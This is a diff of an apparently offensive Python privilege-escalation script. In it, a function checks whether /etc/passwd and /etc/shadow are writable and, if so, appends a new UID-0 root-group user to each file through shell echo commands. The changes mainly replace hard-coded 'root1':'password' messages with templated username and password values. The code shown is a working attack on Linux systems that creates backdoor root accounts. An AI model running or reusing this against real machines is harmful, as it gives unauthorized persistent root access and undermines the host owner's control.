@@ -454,13 +454,13 @@ def pass_shadow(username,password):
       perms = passwd.readline()
       writable = re.search("\\A.......rw|\\A.......-w", perms)
       if writable:
-         print("\n### /etc/passwd is writable! creating user 'root1':'password'... ###")
+         print("\n### /etc/passwd is writable! creating user '{}':'{}'... ###".format(username,password))
          os.system("echo '{}:{}:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,new_user_pass,username,username))
-         print("\n### root-group user 'root1':'password' created... :su root1 ###")
-         os.system("echo '### /etc/passwd is world-writable and can be exploited for privilege excalation ###' > /tmp/passwd_res.txt")
+         print("\n### root-group user '{}':'{}' created... :su {} ###".format(username,password,username))
+         os.system("echo '### root-group user {}:{} created... :su {} ###' > /tmp/passwd_res.txt".format(username,password,username))
       else:
          print("\n*** /etc/passwd is not writable ***")
-         os.system("echo '*** /etc/shadow is NOT world-writable ***' > /tmp/shad_res.txt")
+         os.system("echo '*** /etc/passwd is NOT world-writable ***' > /tmp/passwd_res.txt")
 
    # check if /etc/shadow is writable and if so, add root user
    os.system("ls -l /etc/shadow > /tmp/shad.txt")
@@ -470,8 +470,8 @@ def pass_shadow(username,password):
       if writable:
          print("\n### /etc/shadow is writable! creating user '{}':'{}'... ###".format(username,password))
          os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
-         print("\n### root-group user 'root1':'password' created... :su root1 ###")
-         os.system("echo '### /etc/shadow is world-writable and can be exploited for privilege excalation ###' > /tmp/shad_res.txt")
+         print("\n### root-group user '{}':'{}' created... :su {} ###".format(username,password,username))
+         os.system("echo '### root-group user {}:{} created... :su {} ###' > /tmp/shad_res.txt".format(username,password,username))
       else:
          print("\n*** /etc/shadow is not writable ***")
          os.system("echo '*** /etc/shadow is NOT world-writable ***' > /tmp/shad_res.txt")
